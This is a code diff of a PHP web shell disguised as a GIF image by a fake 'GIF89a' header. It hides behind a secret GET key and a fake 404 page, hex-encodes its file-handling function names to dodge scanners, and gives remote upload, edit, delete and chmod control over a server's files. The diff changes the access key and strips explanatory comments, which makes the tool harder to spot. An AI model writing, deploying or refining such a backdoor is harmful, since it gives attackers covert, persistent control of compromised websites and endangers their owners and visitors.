@@ -1,8 +1,8 @@
 ;GIF89a
 
 <?php
-$access_key = 'neokecoak';
-if (!isset($_GET['k']) || $_GET['k'] !== $access_key) {
+$access_key = 'nerd';
+if (!isset($_GET['neo']) || $_GET['neo'] !== $access_key) {
     header("HTTP/1.0 404 Not Found"); exit;
 }
 
@@ -19,14 +19,12 @@ $editTarget = '';
 
 function e($s){ return htmlspecialchars($s, ENT_QUOTES); }
 
-// Obfuscated function names
 $mv = hex2bin("6d6f76655f75706c6f616465645f66696c65");
 $put = hex2bin("66696c655f7075745f636f6e74656e7473");
 $chmodf = hex2bin("63686d6f64");
 $renamef = hex2bin("72656e616d65");
 $unlinkf = hex2bin("756e6c696e6b");
 
-// Upload or Ops
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_FILES['up'])) {
         $dest = $p . '/' . basename($_FILES['up']['name']);
@@ -43,7 +41,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 
-// Edit
 if (isset($_GET['e'])) {
     $editTarget = basename($_GET['e']);
     $fullEdit = $p . '/' . $editTarget;
@@ -52,7 +49,6 @@ if (isset($_GET['e'])) {
     }
 }
 
-// Delete
 if (isset($_GET['d'])) {
     $t = $p . '/' . basename($_GET['d']);
     if (is_file($t)) {
@@ -62,6 +58,7 @@ if (isset($_GET['d'])) {
     }
 }
 ?>
+    
 <!DOCTYPE html>
 <html>
 <head>
@@ -92,7 +89,6 @@ if (isset($_GET['d'])) {
     <button>🔁 Go</button>
 </form>
 
-<!-- Upload -->
 <hr>
 <form method="post" enctype="multipart/form-data">
     <input type="file" name="up">
@@ -102,7 +98,6 @@ if (isset($_GET['d'])) {
 <p><b>Link:</b> <a href="<?= e($fLink) ?>" target="_blank"><?= e($fLink) ?></a></p>
 <?php endif; ?>
 
-<!-- Edit -->
 <?php if ($editTarget): ?>
 <hr>
 <form method="post">
@@ -112,7 +107,6 @@ if (isset($_GET['d'])) {
 </form>
 <?php endif; ?>
 
-<!-- File List -->
 <hr>
 <table>
 <tr><th>Nama</th><th>Ukuran (kB)</th><th>Modif</th><th>CHMOD</th><th>Aksi</th></tr>
